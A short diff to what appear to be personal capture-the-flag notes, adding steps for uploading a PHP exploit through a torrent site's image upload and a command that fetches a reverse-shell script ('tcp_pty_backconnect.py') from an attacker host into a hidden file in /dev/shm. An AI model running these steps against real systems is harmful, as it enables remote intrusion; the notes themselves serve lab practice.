@@ -11,4 +11,12 @@ namp -sC -sV -O
 
 dirb http://website/ path
 
+upload an empty .torrnt file and we have an option to upload the image for the torrent where we will upload the exploit php file
+
+once done we have the ability to remotely run commands in the machine.
+
+cmd=wget 10.10.16.63:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.pyca
+
+
+
 
